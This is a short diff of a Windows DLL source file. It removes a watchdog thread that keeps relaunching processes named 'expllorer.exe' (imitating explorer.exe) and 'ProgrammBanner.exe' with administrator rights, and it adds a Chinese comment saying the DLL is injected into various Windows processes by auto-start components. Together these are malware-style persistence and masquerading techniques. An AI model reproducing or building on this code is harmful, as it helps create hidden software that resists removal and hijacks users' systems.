@@ -3,23 +3,13 @@
 #include"../file.h"
 #include"GeneralTask.h"
 
+#include<stdio.h>
+
+
+//会被先启动其他自启动组件的注入进各种windows进程
 
 
 
-
-
-DWORD WINAPI MonitorThread(LPVOID lpParam){
-	OutputDebugStringA("Moniter Thread Started.");
-	LPCWSTR A=ConvertToWideString(string(string(BIN_PATH)+string("expllorer.exe"))),B=ConvertToWideString(string(string(BIN_PATH)+string("ProgrammBanner.exe")));
-	while(1){
-		FileProtect();
-		
-		if(!isProcessExist(getSinglePid("expllorer"))){LaunchAdminInteractiveProcess(A);}
-		if(!isProcessExist(getSinglePid("ProgrammBanner"))){LaunchAdminInteractiveProcess(B);}
-		Sleep(4000);
-	}
-	return 0;
-}
 
 
 // DLL入口点
